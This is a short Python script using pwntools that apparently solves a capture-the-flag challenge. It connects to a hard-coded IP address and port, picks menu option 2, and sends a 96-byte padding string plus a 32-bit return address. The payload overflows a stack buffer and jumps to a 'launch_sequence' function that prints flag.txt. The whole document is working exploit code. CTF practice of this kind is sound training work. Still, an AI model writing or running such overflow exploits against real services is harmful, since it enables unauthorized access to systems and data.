#!/usr/bin/env python3
from pwn import *

# --- Config ---
HOST = "49.213.52.6"
PORT = 9998

# 32-bit
context.arch = 'i386'
context.os   = 'linux'
context.log_level = 'info'  # set to 'debug' for verbose output

# Address to jump to (launch_sequence)
launch_addr = 0x08049226

# overflow offset to saved return (from your info)
offset = 96

def build_payload():
    # padding up to saved return then overwrite with launch_sequence address
    payload = b"A" * offset
    payload += p32(launch_addr)   # little-endian 32-bit address
    # no additional ROP needed; return will go directly to launch_sequence
    return payload

def exploit():
    io = remote(HOST, PORT)

    # Wait for menu prompt and choose option 2
    io.recvuntil(b"> ")
    io.sendline(b"2")

    # program prints "Enter mission log:" before calling read()
    io.recvuntil(b"Enter mission log: ")
    payload = build_payload()
    # send the raw payload (no newline required, but safe to include)
    io.send(payload + b"\n")

    # read remote output until it closes (or timeout)
    # launch_sequence reads flag.txt and prints it; capture that output
    try:
        result = io.recvall(timeout=5)
    except EOFError:
        result = b""
    print(result.decode(errors='replace'))

    io.close()

if __name__ == "__main__":
    exploit()
